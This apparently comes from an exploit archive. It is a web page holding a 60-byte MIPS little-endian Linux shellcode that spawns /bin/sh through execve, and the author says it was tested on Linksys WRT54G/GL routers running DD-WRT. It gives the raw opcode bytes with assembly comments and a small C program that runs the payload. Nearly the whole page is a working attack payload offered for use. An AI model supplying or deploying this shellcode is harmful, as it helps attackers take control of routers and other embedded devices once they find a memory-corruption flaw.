<html><head><title>Linux/mips - execve(\\\&quot;/bin/sh\\\&quot;,[\\\&quot;/bin/sh\\\&quot;],[]); - 60 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*	- MIPS little-endian 
 *	- linux execve 60 bytes shellcode 
 *	- execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;],[]);
 *      - tested on Linksys WRT54G/GL (DD-WRT Linux)
 *      - based on scut paper Writing MIPS/Irix shellcode
 *
 *                              vaicebine at gmail dot com
 */
#include &quot;stdio.h&quot;


char shellcode[] = {
	&quot;\x50\x73\x06\x24&quot; /*     li      a2,0x7350             */
	&quot;\xff\xff\xd0\x04&quot; /* LB: bltzal  a2,LB                 */
	&quot;\x50\x73\x0f\x24&quot; /*     li      $t7,0x7350 (nop)      */
	&quot;\xff\xff\x06\x28&quot; /*     slti    a2, $0,-1             */
	&quot;\xe0\xff\xbd\x27&quot; /*     addiu   sp,sp,-32             */
	&quot;\xd7\xff\x0f\x24&quot; /*     li      t7,-41                */
	&quot;\x27\x78\xe0\x01&quot; /*     nor     t7,t7,zero            */    
	&quot;\x21\x20\xef\x03&quot; /*     addu    a0,ra,t7              */
	&quot;\xe8\xff\xa4\xaf&quot; /*     sw      a0,-24(sp)            */
	&quot;\xec\xff\xa0\xaf&quot; /*     sw      zero,-20(sp)          */
	&quot;\xe8\xff\xa5\x23&quot; /*     addi    a1,sp,-24             */        
	&quot;\xab\x0f\x02\x24&quot; /*     li      v0,4011               */
	&quot;\x0c\x01\x01\x01&quot; /*     syscall                       */
	&quot;/bin/sh&quot; 
};

int main(int argc, char *argv[]) 
{
	void (*p)(void);
	p = shellcode;
	printf(&quot;shellcode size %d\n&quot;, sizeof(shellcode));
	p();

	return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
